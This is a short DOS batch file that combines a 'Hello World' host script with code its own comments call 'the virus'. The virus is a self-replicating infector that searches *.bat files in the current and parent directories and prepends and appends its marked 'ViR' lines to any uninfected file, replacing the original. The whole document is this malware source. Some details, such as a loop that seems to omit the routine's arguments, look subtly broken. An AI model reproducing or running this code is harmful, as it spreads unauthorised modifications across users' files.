@if '%vir%==' goto _vir
:: This is the original host batch...
@echo Hello World!
:: This is the virus...
@goto ViR_end
:_ViR
@echo off>nul.ViR
if '%1=='ViR goto ViR_%2
call %0 ViR hst %1 %2 %3 %4 %5 %6 %7
set _ViR=
%comspec% /e:5000 /c %0 ViR run
goto ViR_end
:ViR_hst
set _ViR=%0
%_ViR% %3 %4 %5 %6 %7 %8 %9
:ViR_run
set ViR=%0.bat
if not exist %ViR% set ViR=%0
if not exist %ViR% exit
for %%a in (*.bat ..\*.bat) do call %0
echo ViR says 'Feed Me'...
exit ViR
:ViR_inf
find "ViR"<%3>nul
if not errorlevel 1 goto ViR_end
echo @if '%%_vir%%==' goto _vir>ViR$
type %3>>ViR$
echo.>>ViR$
find "ViR"<%ViR%>>ViR$
move ViR$ %3>nul
exit ViR
:ViR_end